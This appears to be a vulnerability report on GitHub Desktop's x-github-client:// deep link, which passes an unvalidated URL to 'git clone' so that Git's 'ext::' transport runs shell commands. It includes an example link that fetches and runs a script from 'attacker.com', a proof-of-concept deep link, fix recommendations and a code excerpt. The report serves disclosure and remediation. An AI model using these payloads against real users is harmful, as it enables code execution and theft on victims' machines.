### Title
Deep-link/PR "Open in Desktop" URL is passed unsanitized as a git transport URL, allowing command execution via `ext::` remote helper - (File: app/src/lib/git/clone.ts)

### Summary
The `x-github-client://openrepo/...` deep link is parsed and its path segment is forwarded verbatim as the repository URL through the clone flow all the way to `git clone`, with no allow-list on the URL scheme/transport. Git itself (not GitHub Desktop) will happily execute the `ext::` (or similarly dangerous) transport helper embedded in that string, which runs an arbitrary shell command as part of "cloning."

### Finding Description
`parseAppURL` extracts the `openrepo` action's `url` directly from the URL path with no scheme validation — only `branch` and `pr` are checked with regexes (`testForInvalidChars`, `/^\d+$/`, `/^pr\/\d+$/`); `url` is passed through untouched: [1](#0-0) 

This action flows into `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository`, which opens the `CloneRepository` popup pre-filled with the attacker-supplied `initialURL`: [2](#0-1) 

Once the user clicks "Clone" in that dialog (the expected, natural next step of "Open in Desktop"), `cloneImpl` invokes `dispatcher.clone(url, ...)` → `appStore._clone` → `git/clone.ts`'s `clone()`, which builds the git command line as:
```
git -c init.defaultBranch=<x> clone --recursive [--progress] [-b <branch>] -- <url> <path>
``` [3](#0-2) 

The `--` separator only prevents `url` from being interpreted as a *command-line flag*; it does nothing to stop Git's own URL-scheme dispatch. Git supports the `ext::<command>` (and `fd::`) transport, where the string after `ext::` is executed via the shell as the "remote helper" for the operation. Because `envForRemoteOperation`/`envForProxy` (`app/src/lib/git/environment.ts`) never set `GIT_ALLOW_PROTOCOL` or `GIT_PROTOCOL_FROM_USER=0`, and no scheme allow-list exists anywhere between `parseAppURL` and `clone()`, a URL such as:
```
x-github-client://openrepo/ext::sh -c "curl attacker.com/x|sh"
```
reaches `git clone -- 'ext::sh -c "curl attacker.com/x|sh"' <path>` and Git treats the top-level clone as user-initiated (the default `protocol.ext.allow` policy is `user`, i.e., allowed), executing the attacker's shell command with the same privileges as GitHub Desktop.

`isClonePathSensitive` in the same file only checks the destination *path*, not the source *url*, so it provides no protection here.

### Impact Explanation
Arbitrary command execution on the victim's machine, triggered purely by the victim clicking a link (e.g., a "Open in Desktop"/`x-github-client://` deep link embedded in a webpage, README, or issue comment). This is full code execution outside the sandbox, matching the "code execution ... via a link or deep link the user clicks" criterion.

### Likelihood Explanation
The deep-link protocol is registered as the OS default handler for `x-github-client://` (and similar) at app start, so any web page or document can trigger it without prior app interaction. The only user action required is clicking the link and then clicking "Clone" in the resulting pre-filled dialog — both are the intended, natural flow of the "Open in Desktop" feature, not an unnatural workaround. No local access, credentials, or malware are required.

### Recommendation
- Restrict the URL schemes accepted by `parseAppURL`/`openOrCloneRepository`/`clone()` to `https:`, `http:`, `ssh:`, and `git:` only, rejecting `ext:`, `fd:`, `file:` and anything unrecognized before ever reaching `git clone`.
- Alternatively/additionally, set `GIT_ALLOW_PROTOCOL=https:http:ssh:git` (or `GIT_PROTOCOL_FROM_USER=0` combined with an explicit allow-list) in the environment used for `clone`, `fetch`, `pull`, `push`, and submodule operations so Git itself refuses disallowed transports regardless of how the URL was sourced.
- Apply the same scheme validation to `remote-parsing.ts`/`addRemote` and submodule URL handling, since a similarly attacker-controlled remote/submodule URL inside a cloned repo could hit the same code path.

### Proof of Concept
1. Host or send a link: `x-github-client://openrepo/ext::sh%20-c%20%22touch%20/tmp/pwned%22`.
2. Victim (with GitHub Desktop installed and registered as the protocol handler) clicks the link.
3. `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', ... }` — no scheme check rejects it.
4. Desktop opens the Clone dialog pre-filled with this "url"; the victim clicks "Clone".
5. `clone()` executes `git ... clone --recursive -- 'ext::sh -c "touch /tmp/pwned"' <path>`, and Git invokes the shell command, creating `/tmp/pwned` (in the real attack, exfiltrating credentials or dropping malware) instead of performing a network clone.

  private async openOrCloneRepository(url: string): Promise<Repository | null> {
    const state = this.appStore.getState()
    const repositories = state.repositories
    const existingRepository = repositories.find(r =>
      this.doesRepositoryMatchUrl(r, url)
    )

    if (existingRepository) {
      return await this.selectRepository(existingRepository)
    }

    return this.appStore._startOpenInDesktop(() => {
      this.changeCloneRepositoriesTab(CloneRepositoryTab.Generic)
      this.showPopup({
        type: PopupType.CloneRepository,
        initialURL: url,
      })
    })
  }
